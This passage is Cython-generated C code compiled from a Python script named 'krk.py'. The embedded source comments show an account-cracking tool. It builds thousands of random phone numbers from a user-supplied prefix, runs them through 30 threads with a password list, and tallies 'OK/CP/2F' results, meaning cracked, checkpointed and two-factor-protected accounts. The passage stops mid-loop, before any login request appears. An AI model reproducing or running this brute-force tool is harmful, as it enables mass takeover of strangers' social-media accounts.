  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__29); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_cps); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_8 = PyObject_Length(__pyx_t_2); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__29); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_twf); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_8 = PyObject_Length(__pyx_t_2); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":256
 *                 print(' The process has completed')
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                 linex()             # <<<<<<<<<<<<<<
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_linex); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 256, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_3, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 256, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":257
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                 linex()
 *                 input(' Press enter to back ')             # <<<<<<<<<<<<<<
 *                 os.system('python ZEA.py')
 * def bd():
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 257, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":258
 *                 linex()
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')             # <<<<<<<<<<<<<<
 * def bd():
 *                 user=[]
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 258, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 258, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_kp_s_python_ZEA_py};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 258, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":229
 *                 print('\n No internet connection ...')
 *                 exit()
 * def pak():             # <<<<<<<<<<<<<<
 *                 user=[]
 *                 clear()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("krk.pak", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_code);
  __Pyx_XDECREF(__pyx_v_limit);
  __Pyx_XDECREF(__pyx_v_nmbr);
  __Pyx_XDECREF(__pyx_v_nmp);
  __Pyx_XDECREF(__pyx_v_Sabir);
  __Pyx_XDECREF(__pyx_v_tl);
  __Pyx_XDECREF(__pyx_v_psx);
  __Pyx_XDECREF(__pyx_v_ids);
  __Pyx_XDECREF(__pyx_v_passlist);
  __Pyx_XDECREF(__pyx_gb_3krk_3pak_2generator);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":259
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 * def bd():             # <<<<<<<<<<<<<<
 *                 user=[]
 *                 clear()
 */

/* Python wrapper */
static PyObject *__pyx_pw_3krk_9bd(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_3krk_9bd = {"bd", (PyCFunction)__pyx_pw_3krk_9bd, METH_NOARGS, 0};
static PyObject *__pyx_pw_3krk_9bd(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("bd (wrapper)", 0);
  __pyx_r = __pyx_pf_3krk_8bd(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_3krk_2bd_2generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "krk.py":269
 *                         limit = 5000
 *                 for nmbr in range(limit):
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(8))             # <<<<<<<<<<<<<<
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:
 */

static PyObject *__pyx_pf_3krk_2bd_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr *)__pyx_tp_new_3krk___pyx_scope_struct_1_genexpr(__pyx_ptype_3krk___pyx_scope_struct_1_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 269, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_3krk_2bd_2generator1, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_bd_locals_genexpr, __pyx_n_s_krk); if (unlikely(!gen)) __PYX_ERR(0, 269, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("krk.bd.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_3krk_2bd_2generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr *__pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 269, __pyx_L1_error)
  for (__pyx_t_1 = 0; __pyx_t_1 < 8; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 269, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 269, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_string); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 269, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_digits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 269, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    __pyx_t_6 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_6 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_t_5};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_6, 1+__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 269, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_r = __pyx_t_2;
    __pyx_t_2 = 0;
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 269, __pyx_L1_error)
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":259
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 * def bd():             # <<<<<<<<<<<<<<
 *                 user=[]
 *                 clear()
 */

static PyObject *__pyx_pf_3krk_8bd(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_code = NULL;
  PyObject *__pyx_v_limit = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_nmbr = NULL;
  PyObject *__pyx_v_nmp = NULL;
  PyObject *__pyx_v_Sabir = NULL;
  PyObject *__pyx_v_tl = NULL;
  PyObject *__pyx_v_psx = NULL;
  PyObject *__pyx_v_ids = NULL;
  PyObject *__pyx_v_passlist = NULL;
  PyObject *__pyx_gb_3krk_2bd_2generator1 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  PyObject *(*__pyx_t_9)(PyObject *);
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_t_15;
  int __pyx_t_16;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("bd", 0);

  /* "krk.py":260
 *                 os.system('python ZEA.py')
 * def bd():
 *                 user=[]             # <<<<<<<<<<<<<<
 *                 clear()
 *                 print('\033[1;33m Code example: 0306,0315,0335,0345')
 */
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 260, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_user = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  /* "krk.py":261
 * def bd():
 *                 user=[]
 *                 clear()             # <<<<<<<<<<<<<<
 *                 print('\033[1;33m Code example: 0306,0315,0335,0345')
 *                 code = input('\033[1;37m put code: ')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_clear); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 261, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_3, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 261, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":262
 *                 user=[]
 *                 clear()
 *                 print('\033[1;33m Code example: 0306,0315,0335,0345')             # <<<<<<<<<<<<<<
 *                 code = input('\033[1;37m put code: ')
 *                 try:
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__53, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 262, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":263
 *                 clear()
 *                 print('\033[1;33m Code example: 0306,0315,0335,0345')
 *                 code = input('\033[1;37m put code: ')             # <<<<<<<<<<<<<<
 *                 try:
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 263, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_code = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "krk.py":264
 *                 print('\033[1;33m Code example: 0306,0315,0335,0345')
 *                 code = input('\033[1;37m put code: ')
 *                 try:             # <<<<<<<<<<<<<<
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 *                 except ValueError:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_7);
    /*try:*/ {

      /* "krk.py":265
 *                 code = input('\033[1;37m put code: ')
 *                 try:
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))             # <<<<<<<<<<<<<<
 *                 except ValueError:
 *                         limit = 5000
 */
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 265, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_2 = __Pyx_PyNumber_Int(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 265, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_v_limit = __pyx_t_2;
      __pyx_t_2 = 0;

      /* "krk.py":264
 *                 print('\033[1;33m Code example: 0306,0315,0335,0345')
 *                 code = input('\033[1;37m put code: ')
 *                 try:             # <<<<<<<<<<<<<<
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 *                 except ValueError:
 */
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "krk.py":266
 *                 try:
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 *                 except ValueError:             # <<<<<<<<<<<<<<
 *                         limit = 5000
 *                 for nmbr in range(limit):
 */
    __pyx_t_4 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ValueError);
    if (__pyx_t_4) {
      __Pyx_AddTraceback("krk.bd", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_3) < 0) __PYX_ERR(0, 266, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_3);

      /* "krk.py":267
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 *                 except ValueError:
 *                         limit = 5000             # <<<<<<<<<<<<<<
 *                 for nmbr in range(limit):
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
 */
      __Pyx_INCREF(__pyx_int_5000);
      __Pyx_XDECREF_SET(__pyx_v_limit, __pyx_int_5000);
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "krk.py":264
 *                 print('\033[1;33m Code example: 0306,0315,0335,0345')
 *                 code = input('\033[1;37m put code: ')
 *                 try:             # <<<<<<<<<<<<<<
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 *                 except ValueError:
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    __pyx_L8_try_end:;
  }

  /* "krk.py":268
 *                 except ValueError:
 *                         limit = 5000
 *                 for nmbr in range(limit):             # <<<<<<<<<<<<<<
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
 *                         user.append(nmp)
 */
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v_limit); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (likely(PyList_CheckExact(__pyx_t_3)) || PyTuple_CheckExact(__pyx_t_3)) {
    __pyx_t_1 = __pyx_t_3; __Pyx_INCREF(__pyx_t_1); __pyx_t_8 = 0;
    __pyx_t_9 = NULL;
  } else {
    __pyx_t_8 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 268, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 268, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  for (;;) {
    if (likely(!__pyx_t_9)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_8); __Pyx_INCREF(__pyx_t_3); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 268, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 268, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      } else {
        if (__pyx_t_8 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_8); __Pyx_INCREF(__pyx_t_3); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 268, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 268, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      }
    } else {
      __pyx_t_3 = __pyx_t_9(__pyx_t_1);
      if (unlikely(!__pyx_t_3)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 268, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_3);
    }
    __Pyx_XDECREF_SET(__pyx_v_nmbr, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "krk.py":269
 *                         limit = 5000
 *                 for nmbr in range(limit):
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(8))             # <<<<<<<<<<<<<<
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:
 */
    __pyx_t_3 = __pyx_pf_3krk_2bd_genexpr(NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 269, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 269, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF_SET(__pyx_v_nmp, ((PyObject*)__pyx_t_2));
    __pyx_t_2 = 0;

    /* "krk.py":270
 *                 for nmbr in range(limit):
